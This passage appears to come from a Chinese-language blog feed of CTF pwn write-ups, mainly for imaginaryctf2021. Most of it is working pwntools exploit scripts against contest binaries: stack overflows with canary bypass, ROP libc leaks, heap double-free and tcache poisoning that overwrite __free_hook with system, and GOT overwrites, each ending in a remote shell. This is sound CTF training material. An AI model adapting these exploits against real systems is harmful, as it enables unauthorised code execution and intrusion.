class="number">1</span></span><br><span class="line">        depth = <span class="number">0</span></span><br><span class="line">        addition = <span class="number">0</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        print(<span class="string">'one true'</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(hex(libc_start))</span><br><span class="line">libc_start_main=libc_start<span class="number">-234</span></span><br><span class="line">log.info(<span class="string">'libc_start_main:'</span>+str(libc_start_main))</span><br><span class="line">print(count)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>-count):</span><br><span class="line">    target.sendline(str(i))</span><br><span class="line">    target.recvuntil(<span class="string">'Enter your guess:'</span>)</span><br><span class="line">    target.sendline(str(x[i]))</span><br><span class="line"><span class="comment">#gdb.attach(target)</span></span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'__libc_start_main'</span>,libc_start_main)</span><br><span class="line"></span><br><span class="line">target.sendline(<span class="string">'x'</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)+p64(x.ogg(<span class="number">1</span>)))</span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>imaginaryctf2021-pwn-wp</title>
      <link href="/2021/07/28/imaginaryctf2021--pwn-wp/"/>
      <url>/2021/07/28/imaginaryctf2021--pwn-wp/</url>
      
        <content type="html"><![CDATA[<p>又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）</p><a id="more"></a><h2 id="fake-canary"><a href="#fake-canary" class="headerlink" title="fake_canary"></a>fake_canary</h2><p>题目没有看canary，但自己写了类似canary的功能。通过栈溢出在类似canary填上伪造canary即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'./fake_canary'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42002</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400608 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400536 : ret</span></span><br><span class="line"><span class="string">0x0000000000400542 : ret 0x200a</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>*<span class="number">5</span>+p64(<span class="number">0xDEADBEEF</span>)+p64(e.symbols[<span class="string">'win'</span>])+p64(<span class="number">0x00000000000400729</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="linonophobia"><a href="#linonophobia" class="headerlink" title="linonophobia"></a>linonophobia</h2><p>题目很有意思把printf函数地址偷偷换成puts地址。导致本菜鸡在那卡了半天。</p><p>但发现可以通过puts和栈溢出泄露出canary。</p><p>但发现str_bin_sh和onegatgad都打不通。分析elf发现<code>0x000000000601060</code>地址端有写入提示，在此写入后门。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from libcfind import *</span><br><span class="line"></span><br><span class="line">elf&#x3D;&#39;.&#x2F;linonophobia&#39;</span><br><span class="line">e&#x3D;ELF(elf)</span><br><span class="line">context(arch&#x3D;e.arch,log_level&#x3D;&#39;debug&#39;)</span><br><span class="line">p&#x3D;remote(&#39;chal.imaginaryctf.org&#39;,42006)</span><br><span class="line">#p&#x3D;process(elf)</span><br><span class="line">#</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8)</span><br><span class="line">p.recvline()</span><br><span class="line">#print(x)</span><br><span class="line">x&#x3D;p.recvline()[:7]</span><br><span class="line">print(len(x))</span><br><span class="line">print(x)</span><br><span class="line">addr&#x3D;u64(x.rjust(8,&#39;\x00&#39;))</span><br><span class="line"></span><br><span class="line">log.info(hex(addr))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">pay&#x3D;&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)</span><br><span class="line">print(hex(len(pay)))</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">0x000000000040086c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040086e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400870 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400872 : pop r15 ; ret</span><br><span class="line">0x000000000040086b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040086f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400638 : pop rbp ; ret</span><br><span class="line">0x0000000000400873 : pop rdi ; ret</span><br><span class="line">0x0000000000400871 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040086d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400566 : ret</span><br><span class="line">0x0000000000400769 : ret 0x8948</span><br><span class="line">0x0000000000400763 : ret 0xb60f</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">rdi_ret&#x3D;(0x0000000000400873 )</span><br><span class="line"></span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)+p64(0)+p64(rdi_ret)+p64(e.got[&#39;read&#39;])+p64(e.sym[&#39;puts&#39;])+p64(e.sym[&#39;main&#39;]))</span><br><span class="line">puts_addr&#x3D;u64(p.recvline()[:-1].ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.info(hex(puts_addr))</span><br><span class="line">x&#x3D;finder(&#39;read&#39;,puts_addr,num&#x3D;1)</span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)+p64(0)+&#39;\x00&#39;*0x30)</span><br><span class="line"># rbx rbp r12 r13 r14 r15 </span><br><span class="line">def csu(g1,g2,buf,rbx,rbp,r12,r13,r14,r15,lest_cell):</span><br><span class="line">    pay&#x3D;p64(g1)+p64(0)</span><br><span class="line">    pay&#x3D;pay+p64(rbx)+p64(rbp)</span><br><span class="line">    pay&#x3D;pay+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    pay&#x3D;pay+p64(g2)</span><br><span class="line">    pay&#x3D;pay+&#39;\00&#39;*0x38+p64(lest_cell)</span><br><span class="line"></span><br><span class="line">    return pay</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)+p64(0)+p64(rdi_ret)+p64(0x000000000601060)+p64(x.dump(&#39;gets&#39;))+p64(rdi_ret)+p64(0x000000000601060)+p64(x.dump(&#39;system&#39;))+p64(e.sym[&#39;main&#39;]))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;bash\x00&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="memory-pile"><a href="#memory-pile" class="headerlink" title="memory_pile"></a>memory_pile</h2><p>常规2.27libc 的fast bin 二次释放题，劫持<code>__free_hook</code>写入system,来得到shall。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">elf=<span class="string">'./memory_pile'</span></span><br><span class="line"></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42007</span>)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p.recvuntil(<span class="string">"I'll even give you a present, if you manage to unwrap it...\n"</span>)</span><br><span class="line">printf_addr=int(p.recvline(),<span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'With great power comes great responsibility &gt;'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'With great power comes great responsibility &gt;'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'With great power comes great responsibility &gt;'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Let me have it, boss &gt;'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'printf:'</span>+hex(printf_addr))</span><br><span class="line">x=finder(<span class="string">'printf'</span>,printf_addr)</span><br><span class="line">edit(<span class="number">0</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h2><p>rt，简单栈溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./stackoverflow'</span>)</span><br><span class="line"><span class="comment">#p=process('./stackoverflow')</span></span><br><span class="line"><span class="comment">#db.attach(p)</span></span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42001</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>*<span class="number">5</span>+p64(<span class="number">0x69637466</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="the-first-fit"><a href="#the-first-fit" class="headerlink" title="the_first_fit"></a>the_first_fit</h2><p>简单的uaf利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice, choice2;</span><br><span class="line">  <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">  <span class="keyword">char</span> *b;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a is at %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"b is at %p\n"</span>, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"1: Malloc\n2: Free\n3: Fill a\n4: System b\n&gt; "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span>(choice) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"What do I malloc?\n(1) a\n(2) b\n&gt;&gt; "</span>);</span><br><span class="line">              <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2);</span><br><span class="line">              <span class="keyword">if</span> (choice2 == <span class="number">1</span>)</span><br><span class="line">                a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> (choice2 == <span class="number">2</span>)</span><br><span class="line">                b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"What do I free?\n(1) a\n(2) b\n&gt;&gt; "</span>);</span><br><span class="line">              <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2);</span><br><span class="line">              <span class="keyword">if</span> (choice2 == <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">free</span>(a);</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> (choice2 == <span class="number">2</span>)</span><br><span class="line">                <span class="built_in">free</span>(b);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: <span class="built_in">printf</span>(<span class="string">"&gt;&gt; "</span>); <span class="built_in">scanf</span>(<span class="string">"%8s"</span>, a); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: system((<span class="keyword">char</span>*)b); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="string-editor-1"><a href="#string-editor-1" class="headerlink" title="string_editor_1"></a>string_editor_1</h2><p>有意识的一道题，一次只能写入一个字符。但是由于存在数组下标越界，修改管理tetach，range 0x30 tache大于7且第一个的值向<code>__free_hook</code>附近（free_hook-0x20）.利用tache 优先级高于tache的特性，申请到free_hook-0x20的空间，在<code>__free_hook</code>写入<code>system</code>的地址，在free_hook-0x20写入<code>/bin/sh</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">elf=<span class="string">'string_editor_1'</span></span><br><span class="line"></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42004</span>)</span><br><span class="line"><span class="comment">#process(elf)</span></span><br><span class="line">p.recvuntil(<span class="string">'But first, a word from our sponsors:'</span>)</span><br><span class="line">system_addr=int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'system:'</span>+hex(system_addr))</span><br><span class="line">x=finder(<span class="string">'system'</span>,system_addr)</span><br><span class="line">free_hook=p64(x.dump(<span class="string">'__free_hook'</span>)<span class="number">-0x20</span>)</span><br><span class="line">p.sendline(str(<span class="number">-0x290</span>))</span><br><span class="line">p.sendline(<span class="string">'x'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(free_hook),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    </span><br><span class="line">    p.sendline(str(<span class="number">-0x211</span>+i))</span><br><span class="line">    p.sendline(free_hook[i<span class="number">-1</span>])</span><br><span class="line">p.sendline(<span class="string">'15'</span>)</span><br><span class="line">p.sendline(p8(<span class="number">0</span>))</span><br><span class="line">p.sendline(<span class="string">'14'</span>)</span><br><span class="line">p.sendline(p8(<span class="number">0</span>))</span><br><span class="line">system_addrs=p64(system_addr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(system_addrs),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    </span><br><span class="line">    p.sendline(str(<span class="number">0x20</span>+i<span class="number">-1</span>))</span><br><span class="line">    p.sendline(system_addrs[i<span class="number">-1</span>])</span><br><span class="line">shall=<span class="string">'\x00/bin/sh\x00'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shall),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(-i+<span class="number">8</span>))</span><br><span class="line">    p.sendline(shall[-i])</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="string-editor-2"><a href="#string-editor-2" class="headerlink" title="string_editor_2"></a>string_editor_2</h3><p>由于只能下溢出（负数），但能修改got表。修改strpy.got为pintf.got.plt.来通过格式化字符串泄露libcbase。</p><p>这里本地打通了，远程一直没打通，赛后专门看来dalao wp发现方法对的，可能是kali的原因（orw）。</p><p>想了个傻雕方法用<code>add-sysmbols</code>来猜与真实libcbase的差值 。</p><p>然后在修改strpy.got为system的真实地址，得到shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">elf=<span class="string">'./string_editor_2'</span></span><br><span class="line"><span class="comment">#0x601080</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">print(<span class="string">'__libc_start_main-l:'</span>+hex(libc.sym[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">LIBC=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">print(<span class="string">'__libc_start_main-r:'</span>+hex(LIBC.sym[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42005</span>)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">shall='\x00/bin/sh\x00'</span></span><br><span class="line"><span class="string">for i in range(len(shall),-1,-1):</span></span><br><span class="line"><span class="string">    p.sendline(str(-i+8))</span></span><br><span class="line"><span class="string">    p.sendline(shall[-i])</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#864e50</span></span><br><span class="line">sys=p64(e.sym[<span class="string">'printf'</span>]).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(sys)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sys),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(<span class="number">-0x69</span>+i))</span><br><span class="line">    p.sendline(sys[i<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line">shall=<span class="string">'%13$p'</span></span><br><span class="line"><span class="comment">#shall='%16$p' #0x100000000</span></span><br><span class="line"><span class="comment">#shall='%13$p'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shall),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(-i+<span class="number">8</span>))</span><br><span class="line">    p.sendline(shall[-i])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line">p.sendline(str(<span class="number">15</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">'***'</span>)</span><br><span class="line"></span><br><span class="line">addr=int(p.recvuntil(<span class="string">'%'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0x3f</span><span class="number">-0xb4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(hex(addr-LIBC.sym[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'__libc_start_main'</span>,addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys=p64(x.dump(<span class="string">'system'</span>)).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(sys)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sys),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(<span class="number">-0x69</span>+i))</span><br><span class="line">    p.sendline(sys[i<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line">shall=<span class="string">'\x00\x00/bin/sh\x00'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shall),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(-i+<span class="number">8</span>))</span><br><span class="line">    p.sendline(shall[-i])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#db.attach(p)</span></span><br><span class="line">p.sendline(str(<span class="number">15</span>))</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
